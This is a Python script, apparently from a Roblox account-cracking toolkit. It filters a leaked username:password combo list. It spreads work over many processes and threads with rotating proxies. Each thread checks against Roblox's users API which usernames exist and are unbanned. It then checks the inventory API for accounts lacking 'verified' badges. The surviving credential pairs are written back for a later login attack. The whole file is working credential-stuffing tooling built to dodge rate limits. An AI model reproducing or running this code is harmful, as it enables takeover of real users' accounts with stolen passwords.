import itertools
from typing import Iterator
from core.cracker.utils import parse_proxy_url
import multiprocessing
import threading
import socket
import ssl
import json
import os

WORKER_COUNT = 16
THREAD_COUNT = 50

min_uid = 0
max_uid = 0
verified_assets = (
    102611803, # Verified, Bonafide, Plaidafied
    93078560,  # Knight of the Blood Moon
    # 1567446, # Verified Sign -- not reliable
)
users_addr = socket.gethostbyname("users.roblox.com")
inventory_addr = socket.gethostbyname("inventory.roblox.com")
timeout = 5

def validator(
    combo_queue: list,
    valid_queue: list,
    proxy_iter: Iterator,
    ssl_context: ssl.SSLContext
):
    sock = None
    proxy_info = None
    chunk = []
    
    while True:
        if not sock or not proxy_info:
            if sock:
                try: sock.shutdown(2)
                except OSError: pass
                sock.close()
                sock = None

            proxy_info = next(proxy_iter)
            try:
                sock = socket.socket()
                sock.settimeout(timeout)
                sock.connect(proxy_info[0])
                sock.sendall((
                    f"CONNECT {users_addr}:443 HTTP/1.1\r\n"
                    f"{proxy_info[1]}"
                    f"\r\n"
                ).encode())
                status = int(sock.recv(1048576).split(b" ", 2)[1])
                if status != 200:
                    raise ConnectionRefusedError
                sock = ssl_context.wrap_socket(
                    sock, False, False, False, "users.roblox.com")
                sock.do_handshake()
            except:
                proxy_info = None
                continue
            
        if not chunk:
            chunk = dict([
                combo_queue.pop()
                for _ in range(100)
                if combo_queue])
            if not chunk: return
            internal_count = 0
        
        try:
            body = json.dumps({
                "usernames": list(chunk),
                "excludeBannedUsers": True
                }, separators=(",", ":"))
            sock.sendall((
                "POST /v1/usernames/users HTTP/1.1\r\n"
                "Host: users.roblox.com\r\n"
                "Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                "\r\n"
                f"{body}"
            ).encode())
            resp = sock.recv(1024 ** 2)
            
            if not resp.startswith(b"HTTP/1.1 200 OK"):
                proxy_info = None
                if resp.startswith(b"HTTP/1.1 500"):
                    internal_count += 1
                    if internal_count >= 2:
                        if 2 > len(chunk):
                            print(f"skipped {len(chunk)} user(s) due to internal error")
                            chunk = None
                        else:
                            chunk = list(chunk.items())
                            for _ in range(int(len(chunk) / 2)):
                                combo_queue.append(chunk.pop())
                            chunk = dict(chunk)
                            internal_count = 0
                        continue
                continue

            for data in json.loads(resp.split(b"\r\n\r\n", 1)[1][8:-1]):
                if min_uid and min_uid > data["id"]:
                    continue
                if max_uid and data["id"] > max_uid:
                    continue
                valid_queue.append((
                    data["id"],
                    data["name"],
                    chunk[data["requestedUsername"]]))
            
            chunk = None
            
        except Exception as err:
            proxy_info = None

def unverified_validator(
    valid_queue: list,
    unverified_queue: list,
    proxy_iter: Iterator,
    ssl_context: ssl.SSLContext
):
    sock = None
    proxy_info = None
    account = None
    asset_id_index = 0
    
    while True:
        if not sock or not proxy_info:
            if sock:
                try: sock.shutdown(2)
                except OSError: pass
                sock.close()
                sock = None

            proxy_info = next(proxy_iter)
            try:
                sock = socket.socket()
                sock.settimeout(timeout)
                sock.connect(proxy_info[0])
                sock.sendall((
                    f"CONNECT {inventory_addr}:443 HTTP/1.1\r\n"
                    f"{proxy_info[1]}"
                    f"\r\n"
                ).encode())
                status = int(sock.recv(1048576).split(b" ", 2)[1])
                if status != 200:
                    raise ConnectionRefusedError
                sock = ssl_context.wrap_socket(
                    sock, False, False, False, "inventory.roblox.com")
                sock.do_handshake()
            except:
                proxy_info = None
                continue
            
        if not account:
            if not valid_queue: break
            account = valid_queue.pop()
            asset_id_index = 0
        
        try:
            asset_id = verified_assets[asset_id_index]
            sock.sendall((
                f"GET /v1/users/{account[0]}/items/Asset/{asset_id} HTTP/1.1\r\n"
                "Host: inventory.roblox.com\r\n"
                "\r\n"
            ).encode())
            resp = sock.recv(1024 ** 2)
            
            if not resp.startswith(b"HTTP/1.1 200 OK"):
                proxy_info = None
                continue

            if resp.endswith(b"}]}"):
                account = None
                continue
            
            asset_id_index += 1
            if asset_id_index >= len(verified_assets):
                unverified_queue.append(account)
                account = None
            
        except:
            proxy_info = None

def worker_func(
    n: int,
    combo_queue: list,
    proxy_list: list,
    write_lock: multiprocessing.Lock
):
    ssl_context = ssl.create_default_context()
    proxy_iter = itertools.cycle(proxy_list)
    del proxy_list
    valid_queue = []
    unverified_queue = []

    print(f"Worker {n}: Filtering valid users ({len(combo_queue):,})")
    validators = [
        threading.Thread(
            target=validator,
            args=(
                combo_queue,
                valid_queue,
                proxy_iter,
                ssl_context)
        )
        for n in range(THREAD_COUNT)
    ]
    for thread in validators:
        thread.start()
    for thread in validators:
        thread.join()

    print(f"Worker {n}: Filtering unverified users ({len(valid_queue):,})")
    validators = [
        threading.Thread(
            target=unverified_validator,
            args=(
                valid_queue,
                unverified_queue,
                proxy_iter,
                ssl_context)
        )
        for n in range(THREAD_COUNT)
    ]
    for thread in validators:
        thread.start()
    for thread in validators:
        thread.join()

    if not unverified_queue:
        print(f"Worker {n}: No valid & unverified users found")
        return

    with write_lock:
        print(f"Worker {n}: Writing {len(unverified_queue):,} users")
        with open("data/combos.txt", "a", encoding="UTF-8", errors="ignore") as fp:
            for user_id, username, passwords in unverified_queue:
                for password in passwords:
                    fp.write(f"{username}:{password}\n")

if __name__ == "__main__":
    combo_queue = {}
    with open("data/combos.txt", encoding="UTF-8", errors="ignore") as fp:
        for line in fp:
            try:
                credential, password = line.rstrip().split(":", 1)
                if (2 >= len(credential) or \
                    len(credential) > 20 or \
                    not credential.replace("_", "", 1).isalnum() or \
                    credential.startswith("_") or \
                    credential.endswith("_")
                    ):
                    continue
                credential = credential.lower()
                if (l := combo_queue.get(credential)): l.add(password)
                else: combo_queue[credential] = set((password,))
            except: pass
    combo_queue = list(combo_queue.items())
    combo_chunk_size = round(len(combo_queue) / WORKER_COUNT)

    if os.path.exists("data/combos.txt.old"):
        os.remove("data/combos.txt.old")
    os.rename("data/combos.txt", "data/combos.txt.old")

    proxy_list = set()
    with open("data/proxies.txt", encoding="UTF-8", errors="ignore") as fp:
        for line in fp:
            try:
                proxy_info = parse_proxy_url(line.rstrip())
                proxy_list.add(proxy_info)
            except: pass
    proxy_list = list(proxy_list)
    proxy_chunk_size = round(len(proxy_list) / WORKER_COUNT)

    write_lock = multiprocessing.Lock()
    workers = [
        multiprocessing.Process(
            target=worker_func,
            args=(
                n,
                combo_queue[n * combo_chunk_size : (n+1) * combo_chunk_size],
                proxy_list[n * proxy_chunk_size : (n+1) * proxy_chunk_size],
                write_lock
            )
        )
        for n in range(WORKER_COUNT)]
    for worker in workers:
        worker.start()
    del combo_queue, proxy_list